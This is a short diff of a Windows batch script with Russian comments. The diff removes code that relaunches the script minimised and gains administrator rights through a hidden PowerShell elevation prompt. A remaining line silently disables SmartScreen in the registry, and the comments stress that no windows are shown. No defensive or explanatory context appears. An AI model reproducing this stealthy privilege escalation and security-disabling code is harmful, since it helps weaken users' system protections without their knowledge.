@@ -1,15 +1,5 @@
-��&cls
 @echo off
 setlocal
-
-@if not "%1"=="min" start "" /min "%~f0" min & exit
-
-:: Получаем права администратора (без отображения окон)
->nul 2>&1 "%windir%\system32\cacls.exe" "%windir%\system32\config\system"
-if "%errorlevel%" neq "0" (
-    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0' -ArgumentList \"-elevated\" -WindowStyle Hidden"
-    exit /b 0
-)
 
 :: Отключаем SmartScreen (без отображения окон)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
